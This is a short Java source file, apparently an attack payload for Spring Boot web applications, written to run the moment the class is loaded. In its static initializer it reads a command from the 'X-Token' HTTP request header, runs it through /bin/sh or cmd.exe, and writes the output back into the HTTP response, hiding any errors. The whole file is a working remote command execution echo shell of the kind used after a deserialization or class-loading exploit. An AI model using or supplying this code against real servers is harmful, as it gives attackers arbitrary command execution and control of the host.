package com.example.echo;

/**
 * @author Whoopsunix
 *
 * Version test
 * spring-boot-starter-web
 *  [2.2.x, 2.7.x]
 */
public class SpringEcho {
    public static String HEADER = "X-Token";

    static {
        try {
            Class clazz = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.RequestContextHolder");
            Object object = clazz.getMethod("getRequestAttributes").invoke(null);
            clazz = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.ServletRequestAttributes");
            Object request = clazz.getMethod("getRequest").invoke(object);
            Object response = clazz.getMethod("getResponse").invoke(object);
            java.lang.reflect.Method method = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.http.HttpServletRequest").getDeclaredMethod("getHeader", String.class);
            String header = (String) method.invoke(request, HEADER);
            method = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.ServletResponse").getDeclaredMethod("getWriter");
            Object writer = method.invoke(response);

            if (header != null && !header.isEmpty()) {
                String[] cmd = null;
                String os = System.getProperty("os.name").toLowerCase();
                if (os.contains("win")){
                    cmd = new String[]{"cmd.exe", "/c", header};
                } else {
                    cmd = new String[]{"/bin/sh", "-c", header};
                }
                String result = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();

                writer.getClass().getDeclaredMethod("println", String.class).invoke(writer, result);
                writer.getClass().getDeclaredMethod("flush").invoke(writer);
                writer.getClass().getDeclaredMethod("close").invoke(writer);
            }
        } catch (Exception e) {

        }
    }
}
